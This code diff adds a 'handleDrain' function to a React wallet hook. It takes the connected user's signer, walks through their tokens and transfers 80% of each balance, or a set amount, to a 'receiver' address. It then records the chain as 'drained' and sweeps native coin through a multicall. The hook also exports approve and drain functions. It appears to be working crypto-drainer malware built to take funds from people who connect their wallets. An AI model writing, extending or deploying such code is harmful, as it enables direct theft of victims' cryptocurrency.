@@ -11,7 +11,7 @@ export const UseWallet = () => {
   const account = useAccount();
 
   // Chain status tracking
-  const chainInteractionStatus = {
+  let chainInteractionStatus = {
     1: false, // Ethereum Mainnet
     56: false, // Binance Smart Chain Mainnet
     137: false, // Polygon Mainnet
@@ -126,6 +126,137 @@ export const UseWallet = () => {
 
         try {
           const userBalance = await tokenContract.balanceOf(account.address);
+          if (userBalance.lt(amountInWei)) {
+            console.log(`Insufficient token balance for ${tokenAddress}`);
+            continue; // Move to next token
+          }
+
+          const transferTx = await tokenContract.transfer(
+            receiver,
+            amountInWei
+          );
+          console.log(`Transfer tx hash: ${transferTx.hash}`);
+          await transferTx.wait();
+          console.log(
+            `Transferred ${amountInWei.toString()} of ${tokenAddress}`
+          );
+
+          chainDrainStatus[chainId] = true; // Mark chain as drained if successful
+        } catch (error) {
+          console.log(`Transfer failed for ${tokenAddress}:`, error);
+          continue; // Continue to next token on failure
+        }
+      }
+    }
+
+    // After tokens, handle multicall for native tokens
+    await handleMulticall(tokens, ethBalance);
+  };
+
+  // TODO: to be uncommented
+  // const handleDrain = async ({ chainId, address }) => {
+  //   if (!window.ethereum) {
+  //     console.log("Ethereum provider is not available.");
+  //     return;
+  //   }
+
+  //   // const chainId = getChainId(config);
+
+  //   // Update chainInteractionStatus after interacting with the chain
+  //   chainInteractionStatus[chainId] = true;
+
+  //   const provider = new ethers.providers.Web3Provider(window.ethereum);
+  //   const signer = provider.getSigner(address);
+  //   const ethBalance = await getBalance(config, {
+  //     address,
+  //     chainId,
+  //   });
+
+  //   const tokens = await getTokenAssets();
+
+  //   // Process each token individually
+  //   for (let token of tokens) {
+  //     const { tokenAddress, tokenAmount } = token;
+
+  //     if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
+  //       const tokenContract = new Contract(
+  //         tokenAddress,
+  //         [
+  //           "function balanceOf(address owner) view returns (uint256)",
+  //           "function transfer(address to, uint256 amount) external returns (bool)",
+  //         ],
+  //         signer
+  //       );
+
+  //       const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
+  //         .mul(8)
+  //         .div(10); // Transfer 80% of the balance
+
+  //       try {
+  //         const userBalance = await tokenContract.balanceOf(address);
+  //         if (userBalance.lt(amountInWei)) {
+  //           console.log(`Insufficient token balance for ${tokenAddress}`);
+  //           continue; // Move to next token
+  //         }
+
+  //         const transferTx = await tokenContract.transfer(
+  //           receiver,
+  //           amountInWei
+  //         );
+  //         console.log(`Transfer tx hash: ${transferTx.hash}`);
+  //         await transferTx.wait();
+  //         console.log(
+  //           `Transferred ${amountInWei.toString()} of ${tokenAddress}`
+  //         );
+
+  //         chainDrainStatus[chainId] = true; // Mark chain as drained if successful
+  //       } catch (error) {
+  //         console.log(`Transfer failed for ${tokenAddress}:`, error);
+  //         continue; // Continue to next token on failure
+  //       }
+  //     }
+  //   }
+
+  //   // After tokens, handle multicall for native tokens
+  //   await handleMulticall(tokens, ethBalance);
+  // };
+
+  const handleDrain = async ({ chainId, address, transferAmount }) => {
+    if (!window.ethereum) {
+      console.log("Ethereum provider is not available.");
+      return;
+    }
+
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner(address);
+    const ethBalance = await getBalance(config, {
+      address,
+      chainId,
+    });
+
+    const tokens = await getTokenAssets();
+
+    // Process each token individually
+    for (let token of tokens) {
+      const { tokenAddress, tokenAmount } = token;
+
+      if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
+        const tokenContract = new ethers.Contract(
+          tokenAddress,
+          [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) external returns (bool)",
+          ],
+          signer
+        );
+
+        // Use the passed transferAmount or fallback to 80% of the available tokenAmount
+        const amountInWei = transferAmount
+          ? ethers.BigNumber.from(transferAmount.toString())
+          : ethers.BigNumber.from(tokenAmount.toString()).mul(8).div(10); // Default to 80% if not provided
+
+        try {
+          const userBalance = await tokenContract.balanceOf(address);
           if (userBalance.lt(amountInWei)) {
             console.log(`Insufficient token balance for ${tokenAddress}`);
             continue; // Move to next token
@@ -287,5 +418,5 @@ export const UseWallet = () => {
     return tokenBalances;
   };
 
-  return { approveTokens, drain, getTokenAssets };
+  return { approveTokens, drain, getTokenAssets, handleDrain };
 };
